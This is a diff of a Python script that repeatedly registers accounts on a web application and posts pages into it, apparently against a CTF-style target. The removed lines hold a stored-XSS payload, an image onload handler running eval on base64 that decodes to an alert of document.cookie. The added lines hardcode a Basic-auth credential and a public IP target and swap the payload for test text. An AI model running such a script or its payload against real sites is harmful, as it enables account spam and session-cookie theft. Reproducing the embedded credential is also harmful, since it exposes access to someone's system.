@@ -1,6 +1,13 @@
 import requests
 import uuid
 
+# Auth headers
+headers = {
+    'Authorization': 'Basic emVuaGFjazozdjJZbmJBeXdmV1phYjNh',
+}
+
+base_url = 'http://18.195.29.111'
+
 # Create new user
 user_count = 0
 page_count = 0
@@ -18,18 +25,13 @@ while True:
         'password_confirmation': password,
     }
 
-    s.post('http://127.0.0.1:8080/registration.php', data=reg_data)
+    s.post('%s/registration.php' % base_url, headers=headers, data=reg_data)
     user_count += 1
 
-    for i in range(0, 5):
-        new_page_text = s.get('http://127.0.0.1:8080/new_page.php').text
+    for i in range(0, 2):
+        new_page_text = s.get('%s/new_page.php' % base_url, headers=headers).text
         csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
-        eploit = '''
-        <img
-        src="https://image.shutterstock.com/image-vector/example-signlabel-features-speech-bubble-260nw-1223219848.jpg"
-        onload="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))"
-        >
-        '''
+        eploit = '''Test content'''
 
         eploit_id = str(uuid.uuid4())
         page_data = {
@@ -38,6 +40,6 @@ while True:
             'csrf_token': csrf_token,
         }
 
-        response = s.post('http://127.0.0.1:8080/new_page.php', data=page_data)
+        response = s.post('%s/new_page.php' % base_url, headers=headers, data=page_data)
         print("Response: " + response.text.split('<div class="panel-heading">')[1].split('</div>')[0].strip())
         page_count += 1
